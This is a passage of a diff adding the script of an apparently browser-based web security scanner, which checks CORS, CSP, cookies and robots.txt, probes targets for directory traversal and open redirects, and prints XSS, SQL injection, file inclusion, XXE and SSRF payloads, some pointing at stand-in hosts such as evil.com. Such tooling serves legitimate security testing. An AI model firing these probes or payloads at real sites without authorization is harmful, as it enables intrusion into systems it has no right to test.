+                        log('💡 <strong>Remediation:</strong> Restrict <code>Access-Control-Allow-Origin</code> to specific trusted domains or use dynamic origin validation if necessary.', 'info');
+                    } else if (acao.includes(',')) {
+                        log(`⚠️ [WARNING] Multiple origins allowed in <code>Access-Control-Allow-Origin: ${acao}</code>. Ensure all listed origins are trusted.`, 'warning');
+                    } else {
+                        log(`✅ <code>Access-Control-Allow-Origin: ${acao}</code> detected. Restricted to a specific origin.`, 'success');
+                    }
+
+                    const acac = headers.get('access-control-allow-credentials');
+                    if (acac === 'true' && acao === '*') {
+                        log('🚨 [CRITICAL] <code>Access-Control-Allow-Credentials: true</code> combined with <code>Access-Control-Allow-Origin: *</code>. This is a severe misconfiguration allowing authenticated cross-origin requests from any domain.', 'critical');
+                        log('💡 <strong>Remediation:</strong> Never set <code>Access-Control-Allow-Credentials: true</code> when <code>Access-Control-Allow-Origin</code> is wildcard (*).', 'info');
+                    } else if (acac === 'true') {
+                        log(`✅ <code>Access-Control-Allow-Credentials: true</code> detected (securely used with specific origin).`, 'success');
+                    }
+                    
+                    const acam = headers.get('access-control-allow-methods');
+                    if (acam && acam.includes('*')) {
+                        log('⚠️ [WARNING] <code>Access-Control-Allow-Methods: *</code> detected. Allows any HTTP method. While not always critical, it\'s best practice to restrict to only necessary methods.', 'warning');
+                    }
+                } else {
+                    log('💡 [INFO] No <code>Access-Control-Allow-Origin</code> header detected. CORS is likely not explicitly configured or cross-origin requests are not expected.', 'info');
+                }
+            } catch (error) {
+                log(`❌ CORS scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function scanRobotsAndSitemap(url) {
+            log('🤖 Checking <code>robots.txt</code> and <code>sitemap.xml</code> for sensitive paths...', 'info');
+            const baseUrl = new URL(url).origin;
+            const robotsTxtUrl = `${baseUrl}/robots.txt`;
+            const sitemapXmlUrl = `${baseUrl}/sitemap.xml`;
+
+            try {
+                // Check robots.txt
+                const robotsResponse = await fetch(robotsTxtUrl);
+                if (robotsResponse.ok) {
+                    const robotsContent = await robotsResponse.text();
+                    log(`📄 Found <code>robots.txt</code> at: ${robotsTxtUrl}`, 'info');
+                    const sensitivePaths = detectSensitivePaths(robotsContent);
+                    if (sensitivePaths.length > 0) {
+                        log(`🚨 [CRITICAL] <code>robots.txt</code> is disallowing access to potentially sensitive paths: <code>${sensitivePaths.join(', ')}</code>. This indicates these paths exist and their names are disclosed.`, 'critical');
+                        log('💡 <strong>Remediation:</strong> Remove sensitive path names from <code>robots.txt</code>. Use proper access controls (e.g., authentication) instead of relying on robots.txt for security by obscurity.', 'info');
+                    } else {
+                        log('✅ <code>robots.txt</code> does not appear to expose sensitive paths.', 'success');
+                    }
+                } else {
+                    log(`💡 [INFO] No <code>robots.txt</code> found or accessible at ${robotsTxtUrl}.`, 'info');
+                }
+
+                // Check sitemap.xml
+                const sitemapResponse = await fetch(sitemapXmlUrl);
+                if (sitemapResponse.ok) {
+                    const sitemapContent = await sitemapResponse.text();
+                    log(`📄 Found <code>sitemap.xml</code> at: ${sitemapXmlUrl}`, 'info');
+                    const sensitivePaths = detectSensitivePaths(sitemapContent);
+                    if (sensitivePaths.length > 0) {
+                        log(`🚨 [CRITICAL] <code>sitemap.xml</code> is listing potentially sensitive paths: <code>${sensitivePaths.join(', ')}</code>. This can expose directory structures.`, 'critical');
+                        log('💡 <strong>Remediation:</strong> Ensure sitemap.xml only includes public-facing URLs and does not disclose sensitive administrative or internal paths.', 'info');
+                    } else {
+                        log('✅ <code>sitemap.xml</code> does not appear to expose sensitive paths.', 'success');
+                    }
+                } else {
+                    log(`💡 [INFO] No <code>sitemap.xml</code> found or accessible at ${sitemapXmlUrl}.`, 'info');
+                }
+            } catch (error) {
+                log(`❌ Robots/Sitemap scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        function detectSensitivePaths(content) {
+            const sensitiveKeywords = ['admin', 'panel', 'login', 'dashboard', 'secret', 'config', 'backup', 'test', 'dev', 'private', 'db', 'sql', 'users'];
+            const found = [];
+            sensitiveKeywords.forEach(keyword => {
+                const regex = new RegExp(`[\\/_-]${keyword}[\\/_-]`, 'gi'); // matches /admin/, -admin-, _admin_ etc.
+                if (content.match(regex)) {
+                    found.push(keyword);
+                }
+            });
+            return found;
+        }
+
+        async function scanContentSecurityPolicy(url) {
+            log('🛡️ Analyzing Content Security Policy (CSP)...', 'info');
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                const cspHeader = response.headers.get('content-security-policy');
+                
+                if (!cspHeader) {
+                    log('🚨 [CRITICAL] Missing Content-Security-Policy (CSP) header. This leaves the site vulnerable to various injection attacks like XSS.', 'critical');
+                    log('💡 <strong>Remediation:</strong> Implement a strong CSP header. Start with a restrictive policy and gradually relax it as needed.', 'info');
+                    return;
+                }
+                
+                log(`✅ CSP header found: <code>${cspHeader}</code>`, 'success');
+                
+                let issuesFound = false;
+
+                // Check for common CSP bypasses/weaknesses
+                if (cspHeader.includes('unsafe-inline') || cspHeader.includes('unsafe-eval')) {
+                    log('🚨 [CRITICAL] CSP includes <code>unsafe-inline</code> or <code>unsafe-eval</code>. This significantly weakens XSS protection.', 'critical');
+                    log('💡 <strong>Remediation:</strong> Remove <code>unsafe-inline</code> and <code>unsafe-eval</code>. Use nonces or hashes for inline scripts/styles.', 'info');
+                    issuesFound = true;
+                }
+                if (cspHeader.includes('data:') && !cspHeader.includes('data:;')) {
+                    log('⚠️ [WARNING] CSP allows <code>data:</code> URIs. This can sometimes be exploited for XSS.', 'warning');
+                    issuesFound = true;
+                }
+                if (cspHeader.includes('blob:') && !cspHeader.includes('blob:;')) {
+                    log('⚠️ [WARNING] CSP allows <code>blob:</code> URIs. This can sometimes be exploited for XSS.', 'warning');
+                    issuesFound = true;
+                }
+                if (cspHeader.includes('*') && (cspHeader.includes('script-src *') || cspHeader.includes('default-src *'))) {
+                    log('🚨 [CRITICAL] CSP uses wildcard (<code>*</code>) for script or default sources. This largely defeats CSP protection.', 'critical');
+                    log('💡 <strong>Remediation:</strong> Restrict script and default sources to trusted domains. Avoid wildcards.', 'info');
+                    issuesFound = true;
+                }
+                if (!cspHeader.includes('object-src') && !cspHeader.includes('default-src')) {
+                    log('⚠️ [WARNING] Missing <code>object-src</code> directive. Consider explicitly setting <code>object-src \'none\'</code>.', 'warning');
+                    issuesFound = true;
+                }
+                if (!cspHeader.includes('base-uri') && !cspHeader.includes('default-src')) {
+                    log('⚠️ [WARNING] Missing <code>base-uri</code> directive. Consider explicitly setting <code>base-uri \'self\'</code>.', 'warning');
+                    issuesFound = true;
+                }
+                if (!cspHeader.includes('frame-ancestors') && !cspHeader.includes('default-src')) {
+                    log('⚠️ [WARNING] Missing <code>frame-ancestors</code> directive. Consider explicitly setting <code>frame-ancestors \'self\'</code> or <code>\'none\'</code> to prevent clickjacking.', 'warning');
+                    issuesFound = true;
+                }
+
+                if (!issuesFound) {
+                    log('✅ Content Security Policy appears to be well-configured.', 'success');
+                } else {
+                    log('🚨 CSP scan completed with identified weaknesses. Immediate review recommended.', 'critical');
+                }
+
+            } catch (error) {
+                log(`❌ CSP scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function scanCookieSecurity(url) {
+            log('🍪 Analyzing Cookie Security Attributes...', 'info');
+            try {
+                // This is largely client-side and relies on the browser's document.cookie or developer tools.
+                // For a true server-side cookie check, you'd need a backend.
+                // Here, we simulate by checking headers or assumptions.
+                const response = await fetch(url, { method: 'HEAD' });
+                const setCookieHeaders = response.headers.raw()['set-cookie'];
+
+                if (!setCookieHeaders || setCookieHeaders.length === 0) {
+                    log('💡 [INFO] No <code>Set-Cookie</code> headers detected. No cookies appear to be set by the server for this request.', 'info');
+                    return;
+                }
+
+                let cookieIssues = 0;
+                setCookieHeaders.forEach(cookieString => {
+                    log(`🕵️ Found cookie: <code>${cookieString}</code>`, 'info');
+                    if (!cookieString.includes('HttpOnly')) {
+                        log(`⚠️ [WARNING] Cookie missing <code>HttpOnly</code> attribute: <code>${cookieString}</code>. This makes the cookie vulnerable to XSS attacks (javascript access).`, 'warning');
+                        cookieIssues++;
+                    }
+                    if (url.startsWith('https://') && !cookieString.includes('Secure')) {
+                        log(`🚨 [CRITICAL] HTTPS site: Cookie missing <code>Secure</code> attribute: <code>${cookieString}</code>. This allows the cookie to be sent over unencrypted HTTP connections.`, 'critical');
+                        cookieIssues++;
+                    }
+                    if (!cookieString.includes('SameSite=Lax') && !cookieString.includes('SameSite=Strict')) {
+                        log(`⚠️ [WARNING] Cookie missing or has weak <code>SameSite</code> attribute: <code>${cookieString}</code>. Consider <code>SameSite=Lax</code> or <code>SameSite=Strict</code> to mitigate CSRF attacks.`, 'warning');
+                        cookieIssues++;
+                    }
+                    // Consider checking for __Host- and __Secure- prefixes for extra security
+                    if (!cookieString.startsWith('__Host-') && !cookieString.startsWith('__Secure-')) {
+                        log(`💡 [INFO] Consider using <code>__Host-</code> or <code>__Secure-</code> prefixes for important cookies to enforce <code>Secure</code> and <code>HttpOnly</code> attributes.`, 'info');
+                    }
+                });
+
+                if (cookieIssues === 0) {
+                    log('✅ All detected cookies appear to have strong security attributes.', 'success');
+                } else {
+                    log(`🚨 Cookie security scan completed. Found ${cookieIssues} potential issues with cookie attributes.`, 'critical');
+                }
+
+            } catch (error) {
+                log(`❌ Cookie scan failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function scanDirectoryTraversal(url) {
+            log('📁 Testing for Directory Traversal vulnerabilities...', 'info');
+            const testPaths = [
+                '../../../../etc/passwd',
+                '../../../../windows/win.ini',
+                '/WEB-INF/web.xml',
+                '/Proc/self/environ',
+                '/etc/shadow'
+            ];
+            const baseUrl = new URL(url);
+            let vulnerabilityFound = false;
+
+            for (let i = 0; i < testPaths.length; i++) {
+                const path = testPaths[i];
+                const testUrl = new URL(path, baseUrl.href).href; // Correctly construct URL relative to base
+                
+                try {
+                    const response = await fetch(testUrl);
+                    if (response.ok && response.status !== 404) {
+                        const text = await response.text();
+                        if (text.includes('root:x') || text.includes('[fonts]')) { // Basic content check
+                            log(`🚨 [CRITICAL] Directory Traversal vulnerability potentially found at: <code>${testUrl}</code>. Returned sensitive content.`, 'critical');
+                            log('💡 <strong>Remediation:</strong> Implement strict input validation and sanitize all user-supplied paths. Prevent direct access to sensitive files and directories.', 'info');
+                            vulnerabilityFound = true;
+                            break;
+                        }
+                    }
+                } catch (error) {
+                    // Network errors or CORS issues will appear here, which is expected.
+                    // console.warn(`Directory Traversal test to ${testUrl} failed: ${error.message}`);
+                }
+                updateProgress(((i + 1) / testPaths.length) * 100);
+            }
+
+            if (!vulnerabilityFound) {
+                log('✅ No obvious Directory Traversal vulnerabilities detected with common payloads.', 'success');
+            }
+            updateProgress(100);
+        }
+
+        async function scanOpenRedirect(url) {
+            log('➡️ Testing for Open Redirect vulnerabilities...', 'info');
+            const testPayloads = [
+                '//evil.com',
+                '//evil.com%2F',
+                'https://evil.com',
+                'https://evil.com/',
+                'https://example.com@evil.com', // At-sign bypass
+                'https://example.com/%2f%2fevil.com' // Double slash bypass
+            ];
+            let vulnerabilityFound = false;
+
+            for (let i = 0; i < testPayloads.length; i++) {
+                const payload = testPayloads[i];
+                const testUrl = `${url}?next=${encodeURIComponent(payload)}`; // Common redirect parameter name
+                // Add more common parameters if needed
+                const commonParams = ['redirect', 'url', 'destination', 'continue', 'returnTo'];
+                
+                try {
+                    const response = await fetch(testUrl, { redirect: 'manual' }); // Prevent auto-redirect
+                    if (response.status >= 300 && response.status < 400) {
+                        const locationHeader = response.headers.get('Location');
+                        if (locationHeader && locationHeader.includes('evil.com')) {
+                            log(`🚨 [CRITICAL] Open Redirect vulnerability potentially found at: <code>${testUrl}</code>. Redirects to external domain: <code>${locationHeader}</code>.`, 'critical');
+                            log('💡 <strong>Remediation:</strong> Implement strict validation for redirect URLs. Only allow redirects to trusted internal domains or use a whitelist of allowed external domains.', 'info');
+                            vulnerabilityFound = true;
+                            break;
+                        }
+                    }
+                } catch (error) {
+                    // console.warn(`Open Redirect test to ${testUrl} failed: ${error.message}`);
+                }
+                updateProgress(((i + 1) / testPayloads.length) * 100);
+            }
+
+            if (!vulnerabilityFound) {
+                log('✅ No obvious Open Redirect vulnerabilities detected with common payloads.', 'success');
+            }
+            updateProgress(100);
+        }
+
+        // --- Additional Tools Functions ---
+
+        async function startSubdomainEnum() {
+            log('🔍 Starting Subdomain Enumeration (Passive)...', 'info');
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            if (!targetUrl) {
+                log('❌ Please enter a target URL for subdomain enumeration.', 'error');
+                return;
+            }
+
+            let domain;
+            try {
+                domain = new URL(targetUrl).hostname;
+            } catch (e) {
+                log('❌ Invalid URL provided for subdomain enumeration. Please enter a valid URL (e.g., https://example.com).', 'error');
+                return;
+            }
+            
+            const commonSubdomains = ['www', 'mail', 'ftp', 'dev', 'admin', 'test', 'api', 'blog', 'shop', 'cdn'];
+            let foundSubdomains = 0;
+
+            scanStats.scanStartTime = Date.now();
+            scanStats.totalScans++;
+            showProgress(true);
+
+            for (let i = 0; i < commonSubdomains.length; i++) {
+                const sub = commonSubdomains[i];
+                const testSubdomain = `https://${sub}.${domain}`; // Try HTTPS first
+                updateProgress((i / commonSubdomains.length) * 100);
+
+                try {
+                    const response = await fetch(testSubdomain, { method: 'HEAD', mode: 'no-cors' }); // no-cors to avoid CORS issues for cross-origin checks
+                    // A successful response (even opaque due to no-cors) indicates existence
+                    // Status 0 for no-cors fetch is often successful reachability
+                    if (response.status === 0 || (response.status >= 200 && response.status < 400)) {
+                        log(`🌐 Found potential subdomain: <code>${testSubdomain}</code>`, 'info');
+                        foundSubdomains++;
+                    }
+                } catch (e) {
+                    // console.log(`Could not reach ${testSubdomain}`);
+                    // Optionally try HTTP if HTTPS fails, though no-cors might mask the true error
+                    try {
+                        const httpTestSubdomain = `http://${sub}.${domain}`;
+                        const httpResponse = await fetch(httpTestSubdomain, { method: 'HEAD', mode: 'no-cors' });
+                        if (httpResponse.status === 0 || (httpResponse.status >= 200 && httpResponse.status < 400)) {
+                            log(`🌐 Found potential subdomain (HTTP): <code>${httpTestSubdomain}</code>`, 'info');
+                            foundSubdomains++;
+                        }
+                    } catch (e2) {
+                        // All attempts failed for this subdomain
+                    }
+                }
+                await new Promise(resolve => setTimeout(resolve, 100)); // Be gentle
+            }
+            
+            updateProgress(100);
+            setTimeout(() => showProgress(false), 1000);
+
+            if (foundSubdomains === 0) {
+                log('💡 No common subdomains found during passive enumeration.', 'info');
+            } else {
+                log(`✅ Subdomain enumeration completed. Found ${foundSubdomains} potential subdomains.`, 'success');
+            }
+            updateStats();
+        }
+
+        async function batchUrlScan() {
+            log('📋 Starting Batch URL Scan (for Secrets)...', 'info');
+            const content = document.getElementById('scanContent').value;
+            const urls = content.split('\n').map(url => url.trim()).filter(url => url.startsWith('http://') || url.startsWith('https://'));
+
+            if (urls.length === 0) {
+                log('❌ No valid URLs found in the input for batch scanning. Please enter one URL per line.', 'error');
+                return;
+            }
+
+            log(`Scanning ${urls.length} URLs for secrets...`, 'info');
+            scanStats.scanStartTime = Date.now();
+            scanStats.totalScans++;
+            scanStats.secretsFound = 0; // Reset secrets for this batch scan
+            showProgress(true);
+
+            for (let i = 0; i < urls.length; i++) {
+                const url = urls[i];
+                updateProgress((i / urls.length) * 100);
+                log(`🔍 Fetching content from: <code>${url}</code>`, 'info');
+                try {
+                    const response = await fetch(url);
+                    if (response.ok) {
+                        const text = await response.text();
+                        // Perform secret scan on fetched content
+                        // Temporarily change the scanContent textarea value
+                        const originalContent = document.getElementById('scanContent').value; 
+                        document.getElementById('scanContent').value = text;
+                        
+                        log(`🕵️ Analyzing secrets in content from <code>${url}</code>...`, 'info');
+                        await startAdvancedSecretScan(); // Re-use secret scan logic on fetched content
+                        
+                        document.getElementById('scanContent').value = originalContent; // Restore original content
+                    } else {
+                        log(`❌ Failed to fetch content from ${url}: ${response.status} ${response.statusText}`, 'error');
+                    }
+                } catch (error) {
+                    log(`❌ Error fetching ${url}: ${error.message}`, 'error');
+                }
+                await new Promise(resolve => setTimeout(resolve, 500)); // Throttle requests
+            }
+            updateProgress(100);
+            setTimeout(() => showProgress(false), 1000);
+            log('✅ Batch URL scan for secrets completed.', 'success');
+            updateStats();
+        }
+
+        function testSqlInjection() {
+            const url = document.getElementById('targetUrl').value.trim();
+            if (!url) {
+                log('❌ Please enter a target URL for SQL Injection test.', 'error');
+                return;
+            }
+            log('💉 Simulating basic SQL Injection test. Note: This is a client-side simulation.', 'info');
+            log('💡 For real SQLi, you need a backend server to process malicious inputs and observe database errors/delays.', 'info');
+            log('SQLi payloads often include single quotes, double quotes, comments, and boolean logic (e.g., `\' OR 1=1--`).', 'info');
+            log(`Consider payloads like: <code>${url}?id=1' OR 1=1--</code> or <code>${url}?username=admin'--</code>`, 'warning');
+            log('This client-side tool cannot execute actual SQLi. It provides awareness.', 'warning');
+            log('🚨 Manual testing with tools like SQLMap is recommended for actual SQLi assessment.', 'critical');
+        }
+
+        function testXss() {
+            const url = document.getElementById('targetUrl').value.trim();
+            if (!url) {
+                log('❌ Please enter a target URL for XSS test.', 'error');
+                return;
+            }
+            log('🔥 Simulating basic XSS test. Note: This is a client-side simulation.', 'info');
+            log('💡 XSS occurs when untrusted input is reflected in the page without proper sanitization.', 'info');
+            log('Common XSS payloads include: <code><script>alert("XSS")</script></code>, <code><img src=x onerror=alert(1)></code>.', 'info');
+            log(`Try injecting: <code>${url}?param=<script>alert(document.domain)</script></code>`, 'warning');
+            log('This client-side tool cannot detect actual XSS. It provides awareness and payload examples.', 'warning');
+            log('🚨 Manual testing and source code review are essential for identifying XSS vulnerabilities.', 'critical');
+        }
+
+        function testClickjacking() {
+            const url = document.getElementById('targetUrl').value.trim();
+            if (!url) {
+                log('❌ Please enter a target URL for Clickjacking test.', 'error');
+                return;
+            }
+            log('🎯 Simulating Clickjacking test. Note: This is a client-side simulation.', 'info');
+            log('💡 Clickjacking involves tricking a user into clicking something different from what they perceive.', 'info');
+            log('This is typically mitigated by the <code>X-Frame-Options</code> header or CSP\'s <code>frame-ancestors</code> directive.', 'info');
+            log('If the target page can be loaded in an <code>iframe</code> without restrictions, it might be vulnerable.', 'warning');
+            log('If the <code>X-Frame-Options</code> header was missing or improperly configured in the HTTP Header Scan, the site is likely vulnerable.', 'critical');
+            log('🚨 Check the HTTP Headers section for the <code>X-Frame-Options</code> header to determine real vulnerability.', 'critical');
+        }
+        
+        // This port scan is purely illustrative and cannot perform actual network scans from the browser due to security restrictions.
+        // A real port scan would require a backend service.
+        async function portScan() {
+            log('🔌 Simulating Port Scan. Note: This is a client-side simulation and cannot perform actual network scans.', 'info');
+            log('💡 Browsers restrict direct TCP/UDP port scanning for security reasons. A real port scan requires backend capabilities or specialized tools (e.g., Nmap).', 'info');
+            log('This function will only attempt to fetch resources on common HTTP/HTTPS ports.', 'warning');
+
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            if (!targetUrl) {
+                log('❌ Please enter a target URL for port scan simulation.', 'error');
+                return;
+            }
+
+            let hostname;
+            try {
+                hostname = new URL(targetUrl).hostname;
+            } catch (e) {
+                log('❌ Invalid URL provided for port scan simulation. Please enter a valid URL (e.g., https://example.com).', 'error');
+                return;
+            }
+            
+            const commonPorts = [80, 443, 21, 22, 23, 25, 110, 143, 3306, 5432, 8080, 8443]; // Common HTTP/S related, and others for context
+            let openPortsCount = 0;
+
+            scanStats.scanStartTime = Date.now();
+            scanStats.totalScans++;
+            showProgress(true);
+
+            for (let i = 0; i < commonPorts.length; i++) {
+                const port = commonPorts[i];
+                updateProgress((i / commonPorts.length) * 100);
+                const testUrl = `http://${hostname}:${port}/`;
+
+                try {
+                    // Attempt to fetch, but use a short timeout and 'no-cors' to avoid browser blocking
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1500); // 1.5 second timeout
+
+                    const response = await fetch(testUrl, { mode: 'no-cors', signal: controller.signal });
+                    clearTimeout(timeoutId);
+
+                    // For 'no-cors' mode, response.ok is always false. Status is 0 if successful, or network error.
+                    // If no error, we assume the port is reachable (or something is listening)
+                    if (response.type === 'opaque' || response.status === 0) { 
+                        log(`💡 Detected something listening on Port ${port} (<code>${testUrl}</code>) (via no-cors fetch).`, 'info');
+                        openPortsCount++;
+                    }
+                } catch (error) {
+                    if (error.name === 'AbortError') {
+                        // console.log(`Port ${port} timed out.`);
+                    } else {
+                        // console.log(`Error connecting to port ${port}: ${error.message}`);
+                    }
+                }
+                await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
+            }
+            updateProgress(100);
+            setTimeout(() => showProgress(false), 1000);
+            if (openPortsCount > 0) {
+                log(`⚠️ Port scan simulation completed. Detected potential services on ${openPortsCount} common ports.`, 'warning');
+                log('💡 Remember this is a browser-limited simulation. Use server-side tools for accurate port scanning.', 'info');
+            } else {
+                log('✅ Port scan simulation completed. No obvious open ports detected on common HTTP/HTTPS ports.', 'success');
+            }
+            updateStats();
+        }
+
+        function generatePayloads() {
+            log('💥 Generating security payloads...', 'info');
+            const payloadType = document.getElementById('payloadType').value;
+            const encoding = document.getElementById('encoding').value;
+            let payloads = [];
+
+            const commonPayloads = {
+                xss: [
+                    `<script>alert(document.domain)</script>`,
+                    `<img src=x onerror=alert(1)>`,
+                    `<svg/onload=alert(1)>`,
+                    `<body onload=alert(1)>`,
+                    `<a href="javascript:alert(1)">Click Me</a>`
+                ],
+                sqli: [
+                    `' OR 1=1--`,
+                    `" OR "1"="1`,
+                    `admin'--`,
+                    `union select null,null,version()--`,
+                    `1'benchmark(10000000,MD5(1))--`
+                ],
+                lfi: [
+                    `../../../../etc/passwd`,
+                    `../../../../windows/win.ini`,
+                    `/etc/passwd%00`,
+                    `/windows/win.ini%00`
+                ],
+                rfi: [
+                    `http://evil.com/shell.txt?`,
+                    `https://attacker.com/cmd.php`
+                ],
+                xxe: [
+                    `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`,
+                    `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil.dtd"> ]><foo>&xxe;</foo>`
+                ],
+                ssrf: [
+                    `http://localhost/admin`,
+                    `http://127.0.0.1/server-status`,
+                    `file:///etc/passwd`,
+                    `php://filter/resource=http://example.com`,
+                    `dict://localhost:25/helo%20example.com`
+                ]
+            };
+
+            payloads = commonPayloads[payloadType] || [];
+
+            if (payloads.length === 0) {
+                log(`💡 No payloads available for type: ${payloadType}.`, 'info');
+                return;
+            }
+
+            log(`Generated ${payloads.length} payloads for ${payloadType} with ${encoding} encoding:`, 'info');
+            payloads.forEach(p => {
+                let encodedPayload = p;
+                switch (encoding) {
+                    case 'url':
+                        encodedPayload = encodeURIComponent(p);
+                        break;
+                    case 'html':
+                        encodedPayload = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+                        break;
+                    case 'base64':
+                        encodedPayload = btoa(p);
+                        break;
+                    case 'none':
+                    default:
+                        // No encoding
+                        break;
+                }
+                log(`<code>${encodedPayload}</code>`, 'info');
+            });
+            log('✅ Payloads generated.', 'success');
+        }
+
+        function testGenerated() {
+            log('🧪 Simulating test of generated payloads.', 'info');
+            log('💡 This function is a placeholder. For actual testing, you would integrate these payloads into requests to a target system and analyze responses.', 'info');
+            log('You would typically insert the generated payloads into URL parameters, POST data, or headers and observe the application\'s behavior.', 'warning');
+            log('🚨 Automated testing with these payloads requires a custom script or integration with a dedicated vulnerability scanner.', 'critical');
+        }
+
+        function exportResults(format) {
+            log(`📊 Exporting results in ${format.toUpperCase()} format...`, 'info');
+            let data = JSON.stringify(allFindings, null, 2);
+            let filename = `security_scan_results_${new Date().toISOString().replace(/:/g, '-')}`;
+            let mimeType = '';
+
+            if (format === 'csv') {
+                const headers = Object.keys(allFindings[0] || { timestamp: '', type: '', message: '', severity: '' });
+                const csvRows = [
+                    headers.join(','),
+                    ...allFindings.map(row => headers.map(fieldName => JSON.stringify(row[fieldName])).join(','))
+                ].join('\n');
+                data = csvRows;
+                filename += '.csv';
+                mimeType = 'text/csv';
+            } else if (format === 'json') {
+                filename += '.json';
+                mimeType = 'application/json';
+            } else if (format === 'pdf') {
+                log('💡 PDF export requires a server-side component or a library like jsPDF. This is a placeholder.', 'info');
+                alert('PDF export is not supported directly in the browser for complex reports. Consider using a server-side solution.');
+                return;
+            } else {
+                log('❌ Unsupported export format.', 'error');
+                return;
+            }
+
+            if (format === 'json' || format === 'csv') {
+                const blob = new Blob([data], { type: mimeType });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                log(`✅ Results exported as <code>${filename}</code>.`, 'success');
+            }
+        }
+
+        function shareResults() {
+            log('🔗 Generating shareable link...', 'info');
+            log('💡 Sharing complex scan results directly via URL is impractical due to length limitations. This function is a placeholder.', 'info');
+            log('For sharing, consider exporting the report and then sharing the file securely, or implementing a backend service to store and share results.', 'warning');
+            alert('Sharing results directly via link is not feasible for large reports. Export the report and share the file.');
+        }
+
+        // Initial stat update
+        updateStats();
+
+        // Initial tab activation (ensure it's done after all functions are defined)
+        document.addEventListener('DOMContentLoaded', () => {
+            // Re-select the first tab to apply active class if needed
+            const initialTab = document.querySelector('.tab.active');
+            if (!initialTab) {
+                document.querySelector('.tab').classList.add('active');
+                document.getElementById('url-scan').classList.add('active');
+            }
+        });
+    </script>
+</body>
+</html>
